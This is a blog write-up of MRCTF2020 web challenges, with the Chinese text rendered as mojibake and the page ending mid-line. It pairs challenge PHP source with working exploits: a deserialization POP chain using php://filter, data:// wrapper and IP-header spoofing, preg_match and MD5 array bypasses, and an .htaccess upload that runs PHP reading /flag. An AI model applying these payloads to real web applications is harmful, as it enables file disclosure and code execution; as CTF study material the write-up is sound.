<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-MRCTF2020-web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/09/MRCTF2020-web/" class="article-date">
  <time datetime="2020-04-09T02:55:00.000Z" itemprop="datePublished">2020-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MRCTF2020-web"><a href="#MRCTF2020-web" class="headerlink" title="MRCTF2020-web"></a>MRCTF2020-web</h1><p>MRCTF2020-web</p>
<h1 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h1><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>è€ƒå¯Ÿï¼šMD5å¼ºç›¸ç­‰ç»•è¿‡ï¼Œis_number()ç»•è¿‡</p>
<p>æä¾›æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: id[]=<span class="number">1</span>&amp;&amp;gg[]=<span class="number">2</span></span><br><span class="line">POST: passwd=<span class="number">1234567</span>a</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>è€ƒå¯Ÿååºåˆ—åŒ–</p>
<p>æä¾›æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">'php://filter/read=convert.base64-encode/resource=./flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$c = <span class="keyword">new</span> test();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$c-&gt;p = $a;</span><br><span class="line">$b-&gt;str = $c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b-&gt;source = $b;</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br></pre></td></tr></table></figure>



<p>å‚è€ƒæ–‡ç« :<a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">https://www.cnblogs.com/fish-pompom/p/11126473.html</a></p>
<h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>è€ƒç‚¹ï¼šdataä¼ªåè®®ï¼Œphpç‰¹æ€§</p>
<p>æä¾›æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>phpä¼šå°†ç©ºæ ¼ä»¥åŠ<code>.</code>æ¢æˆ<code>_</code></p>
<p><code>preg_match()</code>ä½¿ç”¨<code>%0a</code>ç»•è¿‡</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b.u.p.t=23333%0A</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ°<code>secrettw.php</code></p>
<p><img src="/.com//1.png" alt="image-20200406182630113"></p>
<p>F12è§£ç jsfuckï¼Œè¦æˆ‘ä»¬POST</p>
<p><img src="/.com//2.png" alt="image-20200406182821842"></p>
<p><code>post:Merak=1</code></p>
<p>ç„¶åè·å¾—æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆ<code>ip</code>ç”¨<code>Client-ip: 127.0.0.1</code>ç»•è¿‡</p>
<p><code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>ç”¨<code>dataä¼ªåè®®ç»•è¿‡</code></p>
<p>ç„¶åæ ¹æ®è§£ç ç®—æ³•å†™å‡ºåŠ å¯†ç®—æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($payload)</span></span>&#123; </span><br><span class="line">      <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;strlen($payload); $i++)&#123;</span><br><span class="line">        $re .= chr(ord($payload[$i])-$i*<span class="number">2</span>);  </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> base64_encode($re);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> enc(<span class="string">'flag.php'</span>);</span><br><span class="line">  <span class="comment">//flag.phpåŠ å¯†åå¾—åˆ°ï¼šZmpdYSZmXGI=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="number">2333</span>=data:<span class="comment">//text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=&amp;file=ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”<code>Client-ip:127.0.0.1</code></p>
<p>è·å¾—flag</p>
<p><img src="/.com//3.png" alt="image-20200406183320560"></p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>è€ƒç‚¹ï¼š.htaccessä¸Šä¼ </p>
<p>ä¸Šä¼ å•¥éƒ½ä¸è¡Œï¼Œç„¶åä¸Šä¼ <code>.htaccess</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"txt"</span>&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>



<p>ç„¶åä¸Šä¼ <code>txt</code>æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;readfile(<span class="string">'/flag'</span>);&lt;/script&gt;</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//4.png" alt="image-20200406204759629"></p>
<p>è¿™ä¸ªæ²¡è¢«ç¦ï¼ŒåŒæ—¶<code>file_get_contents</code>ï¼Œè¿™ä¸ªä¹Ÿæ²¡æœ‰è¢«ç¦</p>
<p>æ‰€ä»¥ä¸Šä¼ çš„txtæ–‡ä»¶å°±å¯ä»¥è·å¾—flagäº†ã€‚</p>
<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>è€ƒç‚¹:ä¼ªéšæœºæ•°æ¼æ´</p>
<p>åœ¨<a href="http://www.zipå‘ç°æºç " target="_blank" rel="noopener">www.zipå‘ç°æºç </a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url= '</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = 